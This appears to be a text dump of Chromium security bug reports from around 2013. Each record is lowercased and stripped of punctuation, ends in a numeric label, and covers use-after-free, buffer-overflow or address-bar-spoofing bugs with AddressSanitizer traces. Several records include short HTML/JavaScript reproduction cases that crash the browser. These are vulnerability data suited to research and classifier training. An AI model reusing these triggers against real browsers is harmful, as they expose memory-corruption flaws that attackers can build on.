base/message_loop/message_loop.cc:303 27 in renderermain b/build/slave/asan_release__symbolized_/build/src/out/release content/renderer/renderer_main.cc:242 28 in runzygote b/build/slave/asan_release__symbolized_/build/src/out/release content/app/content_main_runner.cc:391 29 in runnamedprocesstypemain b/build/slave/asan_release__symbolized_/build/src/out/release content/app/content_main_runner.cc:451 previously allocated by thread t0 chrome here 0 in operator new asan_rtl 1 in create b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/modules/webaudio/oscillatornode.cpp:52 2 in createoscillator b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/modules/webaudio/audiocontext.cpp:548 3 in createoscillatormethod b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/v8audiocontext.cpp:547 4 in createoscillatormethodcallback b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/v8audiocontext.cpp:554 5 in call b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/arguments.cc:103 6 in handleapicallhelper false b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/builtins.cc:1272 7 in builtin_handleapicall b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/builtins.cc:1288 8 9 10 11 8 in invoke b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/execution.cc:119 9 in run b/build/slave/asan_release__symbolized_/build/src/out/release v8/src/api.cc:2040 10 in runcompiledscript b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/bindings/v8/v8scriptrunner.cpp:95 11 in compileandrunscript b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:233 12 in executescriptinmainworld b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:673 13 in executescript b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:345 14 in preparescript b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:258 15 in runscript b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:298 16 in execute b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:171 17 in runscriptsforpausedtreebuilder b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:256 18 in processparsedchunkfrombackgroundparser b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:428 19 in pumppendingspeculations b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:466 20 in didreceiveparsedchunkfrombackgroundparser b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:316 21 in operator b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/functional.h:210 22 in operator b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/functional.h:420 23 in callfunctionobject b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/wtf/mainthread.cpp:62 24 in makeitso b/build/slave/asan_release__symbolized_/build/src/out/release base/bind_internal.h:871 25 in runtask b/build/slave/asan_release__symbolized_/build/src/out/release base/message_loop/message_loop.cc:478 shadow bytes around the buggy address fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00	11
heap-use-after-free in xsltapplysequenceconstructor tested on os ubuntu 12.04 chromium 30.0.1599.0 developer build 217118 repro-file xml-stylesheet type application/xml href svg xmlns xmlns xslt xslt version 1.0 xslt attribute nnnnnnnnnnname fill lime xslt attribute asan-report 4158==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in xsltapplysequenceconstructor b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/transform.c:2588:0 1 in xsltapplyxslttemplate b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/transform.c:3044:0 2 in xsltprocessonenode b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/transform.c:2045:0 3 in xsltapplystylesheetinternal b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/transform.c:6049:0 4 in webcore xsltprocessor transformtostring webcore node wtf string wtf string wtf string b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/xml/xsltprocessorlibxslt.cpp:327:0 5 in webcore document applyxsltransform webcore processinginstruction b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/dom/document.cpp:3966:0 is located 16 bytes inside of 312-byte region freed by thread t0 chrome here 0 in free asan_rtl_:0 1 in xsltfreestyleprecomps b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/preproc.c:1947:0 2 in xsltfreestylesheet b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/xslt.c:960:0 3 in xsltparsestylesheetimporteddoc b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/xslt.c:6638:0 4 in xsltparsestylesheetdoc b/build/slave/asan_release__symbolized_/build/src/out/release third_party/libxslt/libxslt/xslt.c:6666:0 5 in webcore xslstylesheet compilestylesheet b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/xml/xslstylesheetlibxslt.cpp:232:0 6 in webcore xsltstylesheetpointer wtf refptr webcore xslstylesheet webcore node b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/xml/xsltprocessorlibxslt.cpp:241:0	11
heap-use-after-free in ppapi proxy pluginresource notifyinstancewasdeleted vulnerability details test case in issue 227350 and 159429 reproduces again version chrome version 29.0.1547.57 beta 31.0.1607.0 218472 trunk operating system ubuntu 12.04 64bit reproduction case ppapi pdf plugin should be available 1 download and copy repro.html to local web server 2 open chrome and open repro.html 3 sad tab is displayed for crashes please include the following additional information type of crash tab crash state asan output 28872==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in std rb_tree int std pair int const scoped_refptr ppapi proxy pluginresourcecallbackbase std select1st std pair int const scoped_refptr ppapi proxy pluginresourcecallbackbase std less int std allocator std pair int const scoped_refptr ppapi proxy pluginresourcecallbackbase m_begin usr/lib/gcc/x86_64-linux-gnu/4.6 include/c++/4.6/bits/stl_tree.h:493 1 in std rb_tree int std pair int const scoped_refptr ppapi proxy pluginresourcecallbackbase std select1st std pair int const scoped_refptr ppapi proxy pluginresourcecallbackbase std less int std allocator std pair int const scoped_refptr ppapi proxy pluginresourcecallbackbase clear usr/lib/gcc/x86_64-linux-gnu/4.6 include/c++/4.6/bits/stl_tree.h:809 2 in ppapi resourcetracker diddeleteinstance int out/release ppapi/shared_impl/resource_tracker.cc:160 3 in content hostglobals instancedeleted int out/release content/renderer/pepper/host_globals.cc:257 4 in pepperplugininstanceimpl out/release content/renderer/pepper/pepper_plugin_instance_impl.cc:563 5 in pepperplugininstanceimpl out/release content/renderer/pepper/pepper_plugin_instance_impl.cc:524 6 in scoped_refptr content pepperplugininstanceimpl operator content pepperplugininstanceimpl out/release base/memory/ref_counted.h:267 7 in content pepperwebpluginimpl destroy out/release content/renderer/pepper/pepper_webplugin_impl.cc:126 8 in webplugincontainerimpl out/release third_party/webkit/source/web/webplugincontainerimpl.cpp:648 9 in webplugincontainerimpl out/release third_party/webkit/source/web/webplugincontainerimpl.cpp:642 10 in wtf hashtable wtf refptr webcore widget wtf keyvaluepair wtf refptr webcore widget webcore frameview wtf keyvaluepairkeyextractor wtf keyvaluepair wtf refptr webcore widget webcore frameview wtf ptrhash wtf refptr webcore widget wtf keyvaluepairhashtraits wtf hashtraits wtf refptr webcore widget wtf hashtraits webcore frameview wtf hashtraits wtf refptr webcore widget deallocatetable wtf keyvaluepair wtf refptr webcore widget webcore frameview int out/release third_party/webkit/source/wtf/hashtable.h:876 11 in webcore widgethierarchyupdatessuspensionscope movewidgets out/release third_party/webkit/source/core/rendering/renderwidget.cpp:69 12 in widgethierarchyupdatessuspensionscope out/release third_party/webkit/source/core/rendering/renderwidget.h:40 13 in webcore containernode removechild webcore node webcore exceptionstate out/release third_party/webkit/source/core/dom/containernode.cpp:498 14 in webcore collectchildrenandremovefromoldparent webcore node wtf vector wtf refptr webcore node 11ul webcore exceptionstate out/release third_party/webkit/source/core/dom/containernode.cpp:70 15 in webcore containernode appendchild wtf passrefptr webcore node webcore exceptionstate webcore attachbehavior out/release third_party/webkit/source/core/dom/containernode.cpp:609 16 in webcore node appendchild wtf passrefptr webcore node webcore exceptionstate webcore attachbehavior out/release third_party/webkit/source/core/dom/node.cpp:543 17 in webcore v8node appendchildmethodcustom v8 functioncallbackinfo v8 value const out/release third_party/webkit/source/bindings/v8/custom/v8nodecustom.cpp:120 18 in webcore nodev8internal appendchildmethodcallbackformainworld v8 functioncallbackinfo v8 value const out/release/gen/blink/bindings/v8node.cpp:703 19 in v8 internal functioncallbackarguments call v8 handle v8 value v8 arguments const out/release v8/src/arguments.cc:103 addr2line no such file 20 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate out/release v8/src/builtins.cc:1272 21 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate out/release v8/src/builtins.cc:1288 22 in is located 72 bytes inside of 384-byte region freed by thread t0 chrome here 0 in operator delete asan_rtl 1 in ppapi resource notifyinstancewasdeleted out/release ppapi/shared_impl/resource.cc:70 2 in ppapi proxy pluginresource notifyinstancewasdeleted out/release ppapi/proxy/plugin_resource.cc:62 3 in ppapi resourcetracker diddeleteinstance int out/release ppapi/shared_impl/resource_tracker.cc:160 4 in content hostglobals instancedeleted int out/release content/renderer/pepper/host_globals.cc:257 5 in pepperplugininstanceimpl out/release content/renderer/pepper/pepper_plugin_instance_impl.cc:563 6 in pepperplugininstanceimpl out/release content/renderer/pepper/pepper_plugin_instance_impl.cc:524 7 in scoped_refptr content pepperplugininstanceimpl operator content pepperplugininstanceimpl out/release base/memory/ref_counted.h:267 8 in content pepperwebpluginimpl destroy out/release content/renderer/pepper/pepper_webplugin_impl.cc:126 9 in webplugincontainerimpl out/release third_party/webkit/source/web/webplugincontainerimpl.cpp:648 10 in webplugincontainerimpl out/release third_party/webkit/source/web/webplugincontainerimpl.cpp:642 11 in wtf hashtable wtf refptr webcore widget wtf keyvaluepair wtf refptr webcore widget webcore frameview wtf keyvaluepairkeyextractor wtf keyvaluepair wtf refptr webcore widget webcore frameview wtf ptrhash wtf refptr webcore widget wtf keyvaluepairhashtraits wtf hashtraits wtf refptr webcore widget wtf hashtraits webcore frameview wtf hashtraits wtf refptr webcore widget deallocatetable wtf keyvaluepair wtf refptr webcore widget webcore frameview int out/release third_party/webkit/source/wtf/hashtable.h:876 12 in webcore widgethierarchyupdatessuspensionscope movewidgets out/release third_party/webkit/source/core/rendering/renderwidget.cpp:69 13 in widgethierarchyupdatessuspensionscope out/release third_party/webkit/source/core/rendering/renderwidget.h:40 14 in webcore containernode removechild webcore node webcore exceptionstate out/release third_party/webkit/source/core/dom/containernode.cpp:498 15 in webcore collectchildrenandremovefromoldparent webcore node wtf vector wtf refptr webcore node 11ul webcore exceptionstate out/release third_party/webkit/source/core/dom/containernode.cpp:70 16 in webcore containernode appendchild wtf passrefptr webcore node webcore exceptionstate webcore attachbehavior out/release third_party/webkit/source/core/dom/containernode.cpp:609 17 in webcore node appendchild wtf passrefptr webcore node webcore exceptionstate webcore attachbehavior out/release third_party/webkit/source/core/dom/node.cpp:543 18 in webcore v8node appendchildmethodcustom v8 functioncallbackinfo v8 value const out/release third_party/webkit/source/bindings/v8/custom/v8nodecustom.cpp:120 19 in webcore nodev8internal appendchildmethodcallbackformainworld v8 functioncallbackinfo v8 value const out/release/gen/blink/bindings/v8node.cpp:703 20 in v8 internal functioncallbackarguments call v8 handle v8 value v8 arguments const out/release v8/src/arguments.cc:103 21 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate out/release v8/src/builtins.cc:1272 22 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate out/release v8/src/builtins.cc:1288 23 in 24 in 25 in 26 in 27 in 28 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool out/release v8/src/execution.cc:119 29 in v8 function call v8 handle v8 object int v8 handle v8 value out/release v8/src/api.cc:4387 previously allocated by thread t0 chrome here 0 in operator new asan_rtl 1 in content pepperinprocessresourcecreation createurlloader int out/release content/renderer/pepper/pepper_in_process_resource_creation.cc:131 2 in ppapi thunk anonymous namespace create int out/release ppapi/thunk/ppb_url_loader_thunk.cc:29 3 in 0 4 shadow bytes around the buggy address fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe	11
heap-use-after-free in webcore xmldocumentparser append vulnerability details the attached testcase crashes the asan build of chrome version chrome version asan-symbolized-linux-release-219161 operating system linux 64-bit reproduction case the testcase is attached in crash.zip as it requires multiple files for crashes please include the following additional information type of crash tab crash state asan output attached in stack.txt	11
use-after-free in colorchooserdialog didclosedialog google chrome 29.0.1547.57 m operation system window 7 steps to repro 1 open a new tab 2 open poc.html which means we have two tabs 3 in poc.html page click on button color then you gon na see the page which is poc.html it s gone but the color chooser it s still on the previous page new tab then click on ok or annuler button stack dump 1368.1470 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=f95891c6 ebx=072d97d0 ecx=077cd584 edx=00007797 esi=591fcb45 edi=0018f600 eip=58160a49 esp=0018f52c ebp=0018f534 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_56b30000 colorchooserdialog didclosedialog 58160a49 ff10 call dword ptr eax ds:0023 f95891c6 0:000 k childebp retaddr 0018f534 58160b3a chrome_56b30000 colorchooserdialog didclosedialog c b\build\slave\win\build\src\chrome\browser\ui\views\color_chooser_dialog.cc 76 0018f54c 58160b5d chrome_56b30000 base internal invokehelper 0 void base internal runnableadapter void thiscall colorchooserdialog bool unsigned int ui baseshelldialogimpl runstate void cdecl colorchooserdialog const bool const unsigned int const ui baseshelldialogimpl runstate const makeitso c b\build\slave\win\build\src\base\bind_internal.h 958 0018f56c 56b5aa6c chrome_56b30000 base internal invoker 4 base internal bindstate base internal runnableadapter void thiscall colorchooserdialog bool unsigned int ui baseshelldialogimpl runstate void cdecl colorchooserdialog bool unsigned int ui baseshelldialogimpl runstate void cdecl colorchooserdialog bool unsigned int ui baseshelldialogimpl runstate void cdecl colorchooserdialog bool unsigned int ui baseshelldialogimpl runstate run c b\build\slave\win\build\src\base\bind_internal.h 1568 0018f5d8 56b5a7a9 chrome_56b30000 base messageloop runtask c b\build\slave\win\build\src\base\message_loop\message_loop.cc 484 0018f728 56e3aee3 chrome_56b30000 base messageloop dowork c b\build\slave\win\build\src\base\message_loop\message_loop.cc 609 0018f758 56b5a3e0 chrome_56b30000 base messagepumpforui dorunloop c b\build\slave\win\build\src\base\message_loop\message_pump_win.cc 243 0018f778 56b5a34b chrome_56b30000 base messageloop runinternal c b\build\slave\win\build\src\base\message_loop\message_loop.cc 431 0018f788 570838aa chrome_56b30000 base runloop run c b\build\slave\win\build\src\base\run_loop.cc 46 0018f800 57083793 chrome_56b30000 chromebrowsermainparts mainmessagelooprun c b\build\slave\win\build\src\chrome\browser\chrome_browser_main.cc 1637 0018f814 5708375d chrome_56b30000 content browsermainloop runmainmessageloopparts c b\build\slave\win\build\src\content\browser\browser_main_loop.cc 672 0018f824 56dbe66c chrome_56b30000 content browsermainrunnerimpl run c b\build\slave\win\build\src\content\browser\browser_main_runner.cc 114 0018f85c 56b4be18 chrome_56b30000 content browsermain c b\build\slave\win\build\src\content\browser\browser_main.cc 26 0018f870 56b4bd9f chrome_56b30000 content runnamedprocesstypemain c b\build\slave\win\build\src\content\app\content_main_runner.cc 443 0018f8dc 56b3a9ea chrome_56b30000 content contentmainrunnerimpl run c b\build\slave\win\build\src\content\app\content_main_runner.cc 763 0018f8ec 56b3a6dc chrome_56b30000 content contentmain c b\build\slave\win\build\src\content\app\content_main.cc 35 0018f924 00414a87 chrome_56b30000 chromemain c b\build\slave\win\build\src\chrome\app\chrome_main.cc 28 0018f99c 00417983 chrome maindllloader launch c b\build\slave\win\build\src\chrome\app\client_util.cc 189 0018f9c0 00417a00 chrome anonymous namespace runchrome c b\build\slave\win\build\src\chrome\app\chrome_exe_main_win.cc 49 0018fa08 0043648d chrome wwinmain c b\build\slave\win\build\src\chrome\app\chrome_exe_main_win.cc 115 error symbol file could not be found defaulted to export symbols for c windows\system32\kernel32.dll 0018fa98 7653ed6c chrome tmaincrtstartup f dd\vctools\crt_bld\self_x86\crt\src\crt0.c 275	11
possible to hide current address by going to tel link and then a link useragent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/30.0.1599.14 safari/537.36 steps to reproduce the problem 1 click on a link starting with tel 2 click on a link starting with what is the expected behavior to now be at current page something what went wrong the uri has disappeared and it only shows the tel address did this work before n/a chrome version 30.0.1599.14 channel beta os version 6.1 windows 7 windows server 2008 r2 flash version shockwave flash 11.8 r800 the attached image shows what i see when i open the attached html file works both when opening from the file system as well as opening from an http server	9
address bar spoofing with window.open 204 no content useragent mozilla/5.0 windows nt 6.2 wow64 applewebkit/537.36 khtml like gecko chrome/29.0.1547.62 safari/537.36 steps to reproduce the problem 1 go to attached poc 2 click go button 3 you can see www.google.com in address bar but it is incorrect what is the expected behavior chrome should point url correctly what went wrong chrome points incorrect url did this work before n/a chrome version 29.0.1547.62 channel stable os version 6.2 windows 8 flash version shockwave flash 11.8 r800	11
heap-buffer-overflow in webcore reverbconvolverstage reverbconvolverstage vulnerability details heap buffer overflow in audioarray version chrome version 29.0.1547.57 beta operating system debian 7.1 reproduction case html body script var samplerate 44100 var context new webkitofflineaudiocontext 2 samplerate samplerate var squarepulse context.createbuffer 1 1 samplerate var convolver context.createconvolver convolver.buffer squarepulse script body html for crashes please include the following additional information cmdstr chrome disable-setuid-sandbox user-data-dir tmp/profile_1 translate incognito new-window no-default-browser-check allow-file-access-from-files no-first-run 2 1|./asan_symbolize.py|c++filt 25231==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 256 at thread t0 chrome 0 in operator mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/platform/audio/audioarray.h:142 1 in reverbconvolver mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/platform/audio/reverbconvolver.cpp:105 2 in initialize mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/platform/audio/reverb.cpp:125 3 in reverb mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/platform/audio/reverb.cpp:104 4 in setbuffer mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/modules/webaudio/convolvernode.cpp:143 5 in bufferattrsetter mnt/scratch0/tmpbuild/src/out/release/gen/webcore/bindings/v8convolvernode.cpp:84 6 in call mnt/scratch0/tmpbuild/src/out/release v8/src/arguments.cc:186 7 in setpropertywithcallback mnt/scratch0/tmpbuild/src/out/release v8/src/objects.cc:2858 8 in setpropertyforresult mnt/scratch0/tmpbuild/src/out/release v8/src/objects.cc:3857 9 in setproperty mnt/scratch0/tmpbuild/src/out/release v8/src/objects.cc:3380 10 in setpropertyorfail mnt/scratch0/tmpbuild/src/out/release v8/src/objects.cc:2783 11 in store mnt/scratch0/tmpbuild/src/out/release v8/src/ic.cc:1655 12 in rt_impl_storeic_miss mnt/scratch0/tmpbuild/src/out/release v8/src/ic.cc:2246 13 in is located 1 bytes to the left of 16-byte region allocated by thread t0 chrome here 0 in operator new asan_rtl 1 in establishidentifierforpthreadhandle mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/threadingpthreads.cpp:167 2 in createthreadinternal mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/threadingpthreads.cpp:197 3 in createthread mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/threading.cpp:95 4 in asyncaudiodecoder mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/modules/webaudio/asyncaudiodecoder.cpp:44 5 in audiocontext mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/modules/webaudio/audiocontext.cpp:150 6 in offlineaudiocontext mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/modules/webaudio/offlineaudiocontext.cpp:59 7 in constructor mnt/scratch0/tmpbuild/src/out/release/gen/webcore/bindings/v8offlineaudiocontext.cpp:79 8 in call mnt/scratch0/tmpbuild/src/out/release v8/src/arguments.cc:99 9 in handleapicallhelper true mnt/scratch0/tmpbuild/src/out/release v8/src/builtins.cc:1276 10 in 11 in 12 in 13 in 14 in 15 in invoke mnt/scratch0/tmpbuild/src/out/release v8/src/execution.cc:119 16 in run mnt/scratch0/tmpbuild/src/out/release v8/src/api.cc:1968 17 in runcompiledscript mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/bindings/v8/v8scriptrunner.cpp:95 18 in compileandrunscript mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:241 19 in executescriptinmainworld mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:683 20 in executescript mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/scriptelement.cpp:318 21 in preparescript mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/scriptelement.cpp:236 22 in runscript mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:303 23 in execute mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:174 24 in runscriptsforpausedtreebuilder mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:253 25 in processparsedchunkfrombackgroundparser mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:423 26 in pumppendingspeculations mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:461 27 in didreceiveparsedchunkfrombackgroundparser mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:311 28 in passownptr mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/functional.h:210 29 in operator mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/functional.h:577 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 00 fa fa fa 04 fa fa fa 00 fa fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa fd fa fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 25231==aborting	11
heap-use-after-free in webcore renderobjectchildlist destroyleftoverchildren vulnerability details heap-use-after-free in shadowroot version chrome version 28.0.1500.95 stable 29.0.1547.57 beta operating system ubuntu 13.04 reproduction case html style absoluteposition position fixed float before float right content float first-letter float right inline first-letter content style script function go parent document.getelementbyid parent child document.getelementbyid child document.body.offsettop child.setattribute class inline settimeout parent.webkitcreateshadowroot 100 window.onload go script div class float id parent div class absoluteposition id child div a div html for crashes please include the following additional information cmdstr chrome disable-setuid-sandbox user-data-dir tmp/profile_1 translate incognito new-window no-default-browser-check allow-file-access-from-files no-first-run 2 1|./asan_symbolize.py|c++filt 18924==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in firstchild mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderobjectchildlist.h:43 1 in willbedestroyed mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:257 2 in destroy mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderobject.cpp:2580 3 in detach mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/node.cpp:1107 4 in lazyreattach mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/node.h:928 5 in addshadowroot mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/shadow/elementshadow.cpp:41 6 in createshadowroot mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/element.cpp:1570 7 in webkitcreateshadowrootmethod mnt/scratch0/tmpbuild/src/out/release/gen/webcore/bindings/v8element.cpp:3545 8 in call mnt/scratch0/tmpbuild/src/out/release v8/src/arguments.cc:99 9 in handleapicallhelper false mnt/scratch0/tmpbuild/src/out/release v8/src/builtins.cc:1276 10 in is located 136 bytes inside of 176-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl 1 in collapseanonymousboxchild mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:1157 2 in removechild mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:1278 3 in remove mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderobject.h:917 4 in willbedestroyed mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderboxmodelobject.cpp:176 5 in willbedestroyed mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderbox.cpp:168 6 in willbedestroyed mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:298 7 in destroy mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderobject.cpp:2580 8 in willbedestroyed mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/rendertextfragment.cpp:74 9 in destroy mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderobject.cpp:2580 10 in destroyleftoverchildren mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderobjectchildlist.cpp:46 11 in willbedestroyed mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:257 12 in destroy mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderobject.cpp:2580 13 in detach mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/node.cpp:1107 14 in lazyreattach mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/node.h:928 15 in addshadowroot mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/shadow/elementshadow.cpp:41 16 in createshadowroot mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/element.cpp:1570 17 in webkitcreateshadowrootmethod mnt/scratch0/tmpbuild/src/out/release/gen/webcore/bindings/v8element.cpp:3545 18 in call mnt/scratch0/tmpbuild/src/out/release v8/src/arguments.cc:99 19 in handleapicallhelper false mnt/scratch0/tmpbuild/src/out/release v8/src/builtins.cc:1276 20 in 21 in 22 in 23 in 24 in invoke mnt/scratch0/tmpbuild/src/out/release v8/src/execution.cc:119 25 in run mnt/scratch0/tmpbuild/src/out/release v8/src/api.cc:1968 26 in runcompiledscript mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/bindings/v8/v8scriptrunner.cpp:95 27 in compileandrunscript mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/bindings/v8/scriptcontroller.cpp:241 28 in execute 